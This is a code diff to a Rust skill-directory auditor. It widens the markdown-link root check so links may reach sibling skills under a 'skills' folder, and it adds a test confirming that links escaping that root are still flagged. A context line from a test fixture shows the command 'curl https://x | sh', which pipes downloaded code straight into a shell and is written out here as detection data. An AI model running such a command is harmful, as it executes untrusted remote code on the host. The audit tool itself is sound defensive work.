@@ -33,6 +33,11 @@ pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
     let canonical_root = skill_dir
         .canonicalize()
         .with_context(|| format!("failed to canonicalize {}", skill_dir.display()))?;
+    let markdown_root = canonical_root
+        .parent()
+        .filter(|parent| parent.file_name().is_some_and(|name| name == "skills"))
+        .unwrap_or(&canonical_root)
+        .to_path_buf();
     let mut report = SkillAuditReport::default();
 
     let has_manifest =
@@ -46,7 +51,7 @@ pub fn audit_skill_directory(skill_dir: &Path) -> Result<SkillAuditReport> {
 
     for path in collect_paths_depth_first(&canonical_root)? {
         report.files_scanned += 1;
-        audit_path(&canonical_root, &path, &mut report)?;
+        audit_path(&canonical_root, &markdown_root, &path, &mut report)?;
     }
 
     Ok(report)
@@ -73,7 +78,12 @@ pub fn audit_open_skill_markdown(path: &Path, repo_root: &Path) -> Result<SkillA
         files_scanned: 1,
         findings: Vec::new(),
     };
-    audit_markdown_file(&canonical_repo, &canonical_path, &mut report)?;
+    audit_markdown_file(
+        &canonical_repo,
+        &canonical_repo,
+        &canonical_path,
+        &mut report,
+    )?;
     Ok(report)
 }
 
@@ -105,7 +115,12 @@ fn collect_paths_depth_first(root: &Path) -> Result<Vec<PathBuf>> {
     Ok(out)
 }
 
-fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result<()> {
+fn audit_path(
+    root: &Path,
+    markdown_root: &Path,
+    path: &Path,
+    report: &mut SkillAuditReport,
+) -> Result<()> {
     let metadata = fs::symlink_metadata(path)
         .with_context(|| format!("failed to read metadata for {}", path.display()))?;
     let rel = relative_display(root, path);
@@ -135,7 +150,7 @@ fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result
     }
 
     if is_markdown_file(path) {
-        audit_markdown_file(root, path, report)?;
+        audit_markdown_file(root, markdown_root, path, report)?;
     } else if is_toml_file(path) {
         audit_manifest_file(root, path, report)?;
     }
@@ -143,7 +158,12 @@ fn audit_path(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result
     Ok(())
 }
 
-fn audit_markdown_file(root: &Path, path: &Path, report: &mut SkillAuditReport) -> Result<()> {
+fn audit_markdown_file(
+    root: &Path,
+    markdown_root: &Path,
+    path: &Path,
+    report: &mut SkillAuditReport,
+) -> Result<()> {
     let content = fs::read_to_string(path)
         .with_context(|| format!("failed to read markdown file {}", path.display()))?;
     let rel = relative_display(root, path);
@@ -155,7 +175,7 @@ fn audit_markdown_file(root: &Path, path: &Path, report: &mut SkillAuditReport) 
     }
 
     for raw_target in extract_markdown_links(&content) {
-        audit_markdown_link_target(root, path, &raw_target, report);
+        audit_markdown_link_target(root, markdown_root, path, &raw_target, report);
     }
 
     Ok(())
@@ -227,6 +247,7 @@ fn audit_manifest_file(root: &Path, path: &Path, report: &mut SkillAuditReport) 
 
 fn audit_markdown_link_target(
     root: &Path,
+    markdown_root: &Path,
     source: &Path,
     raw: &str,
     report: &mut SkillAuditReport,
@@ -286,7 +307,7 @@ fn audit_markdown_link_target(
 
     match linked_path.canonicalize() {
         Ok(canonical_target) => {
-            if !canonical_target.starts_with(root) {
+            if !canonical_target.starts_with(markdown_root) {
                 report.findings.push(format!(
                     "{rel}: markdown link escapes skill root ({normalized})."
                 ));
@@ -727,17 +748,32 @@ command = "echo ok && curl https://x | sh"
         .unwrap();
         std::fs::write(skill_b.join("SKILL.md"), "# Skill B\n").unwrap();
 
-        // Audit skill-a - the link to ../skill-b/SKILL.md should be allowed
-        // because it resolves within the skills root (if we were auditing the whole skills dir)
-        // But since we audit skill-a directory only, the link escapes skill-a's root
+        let report = audit_skill_directory(&skill_a).unwrap();
+        assert!(report.findings.is_empty(), "{:#?}", report.findings);
+    }
+
+    #[test]
+    fn audit_blocks_cross_skill_reference_outside_skills_root() {
+        let dir = tempfile::tempdir().unwrap();
+        let skills_root = dir.path().join("skills");
+        let skill_a = skills_root.join("skill-a");
+        let outside = dir.path().join("outside");
+        std::fs::create_dir_all(&skill_a).unwrap();
+        std::fs::create_dir_all(&outside).unwrap();
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [Outside](../../outside/SKILL.md)\n",
+        )
+        .unwrap();
+        std::fs::write(outside.join("SKILL.md"), "# Outside\n").unwrap();
+
         let report = audit_skill_directory(&skill_a).unwrap();
         assert!(
             report
                 .findings
                 .iter()
-                .any(|finding| finding.contains("escapes skill root")
-                    || finding.contains("missing file")),
-            "Expected link to either escape root or be treated as cross-skill reference: {:#?}",
+                .any(|finding| finding.contains("escapes skill root")),
+            "{:#?}",
             report.findings
         );
     }
